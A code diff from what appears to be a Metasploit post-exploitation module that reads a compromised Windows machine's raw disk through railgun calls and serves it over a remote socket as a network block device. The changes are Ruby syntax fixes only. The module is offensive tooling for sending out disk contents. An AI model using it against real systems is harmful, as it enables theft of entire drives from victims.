@@ -53,9 +53,8 @@ class Metasploit3 < Msf::Post
 		ioctl = client.railgun.kernel32.DeviceIoControl(handle,ioctl_disk_get_drive_geometry_ex,
 			"",0,200,200,4,"")
 
-		if ioctl['GetLastError'] == 6:
-			ioctl = client.railgun.kernel32.DeviceIoControl(handle,ioctl_disk_get_drive_geometry_ex,
-				"",0,200,200,4,"")
+		if ioctl['GetLastError'] == 6
+			ioctl = client.railgun.kernel32.DeviceIoControl(handle,ioctl_disk_get_drive_geometry_ex, "",0,200,200,4,"")
 		end
 		geometry = ioctl['lpOutBuffer']
 		disk_size = geometry[24,31].unpack('Q')[0]
@@ -83,16 +82,15 @@ class Metasploit3 < Msf::Post
 				print_line("Wrong magic number")
 				break
 			end
-			if request == 2:
+			if request == 2
 				break
 			end
-			if request == 1:
+			if request == 1
 				print_line("Attempted write on a read-only nbd")
 				break
 			end
-			if request == 0:
-				client.railgun.kernel32.SetFilePointer(handle,offset_n[4,7].unpack('N')[0],
-					offset_n[0,4].unpack('N')[0],0)
+			if request == 0
+				client.railgun.kernel32.SetFilePointer(handle,offset_n[4,7].unpack('N')[0], offset_n[0,4].unpack('N')[0],0)
 				rsock.put("gDf\x98\x00\x00\x00\x00")
 				rsock.put(nbd_handle)
 				data = client.railgun.kernel32.ReadFile(handle,length,length,4,nil)['lpBuffer']
